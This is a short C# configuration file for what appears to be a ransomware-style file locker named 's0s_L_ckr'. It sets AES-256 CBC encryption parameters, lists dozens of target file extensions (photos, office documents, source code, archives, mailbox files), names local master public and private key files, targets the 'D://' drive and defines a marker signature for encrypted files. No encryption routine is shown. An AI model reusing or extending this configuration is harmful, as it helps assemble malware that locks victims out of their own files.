using System;
using System.Security.Cryptography;
namespace s0s_L_ckr
{
    //CONFIGURATION CLASS
    public sealed class ConfigMgr
    {
        private ConfigMgr()
        {
        }

        // AES PADDING MOD (Muttable)
        public const PaddingMode CHPR_PAD_MOD = PaddingMode.PKCS7;

        // AES PADDING MOD (IMMUTABLE)
        public const CipherMode CHPR_MOD = CipherMode.CBC;

        //KEY SIZE
        public const int CHPR_KEY_SIZ = 256;


        public static readonly string[] TRGT_FILS = new string[] {
                ".JPG", ".GIF", ".PDF", ".PNG", ".NEF",
                ".ZIP", ".RAR", ".TAR", ".GZ",
                ".CS", ".VB", ".JAVA", ".CLASS", ".JS", ".VBS", ".CSC", ".JSON", ".TXT", ".C", ".CPP", ".H", ".CONFIG", ".PY", ".R", ".XAML", ".JSP", ".PHP",
                ".DOC", ".DOCX", ".XLS", ".XLSX", ".PPT", ".PPTX",
                ".MP3", ".MP4", ".AVI", ".MPEG",
                ".PST", ".MSG", ".EML", ".DBX", ".MBX", ".WAB"
            };
        // LOCAL COPY OF MASTER PUBLIC & PRIV KEY (MUTTABLE)
        public const string LOCL_PUB_KEY_NAM = "master_public_key.info";
        public const string LOCL_PRI_KEY_NAM = "master_private_key.info";
        //PATH for encryption
        public static readonly string[] TRGT_PTH_FLR = new string[] { "D://" };

        public static readonly byte[] FILE_SIGN = new byte[] {
            55,55,
            69,24,
            69,24,
            69,24,
            69,24
        };
        public static readonly int FILE_SIGN_SIZE = FILE_SIGN.Length;
    }
}
